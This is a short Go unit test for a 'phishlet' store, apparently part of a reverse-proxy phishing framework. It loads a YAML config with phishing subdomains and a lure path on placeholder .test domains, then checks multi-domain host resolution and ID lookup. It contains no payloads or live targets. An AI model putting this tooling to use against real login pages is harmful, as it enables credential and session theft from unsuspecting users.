package phishlet

import (
	"os"
	"path/filepath"
	"testing"
)

func writeYAML(t *testing.T, dir, name, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestMultidomain(t *testing.T) {
	dir := t.TempDir()
	writeYAML(t, dir, "a.yaml", `id: m1
version: 2
base_domains: ["a.test", "b.test"]
proxy_hosts: [{phish_sub: "login", orig_sub: "o", domain: "u.test", is_landing: true}]
lure_path: "/l/1"
enabled: true
`)
	st := NewStore()
	if err := st.LoadDir(dir); err != nil {
		t.Fatal(err)
	}
	for _, h := range []string{"login.a.test", "login.b.test"} {
		if ph, _ := st.FindByHost(h); ph == nil {
			t.Fatalf("not resolved: %s", h)
		}
	}
	if st.FindByID("m1") == nil || len(st.All()) != 1 {
		t.Fatal("FindByID/All broken")
	}
}
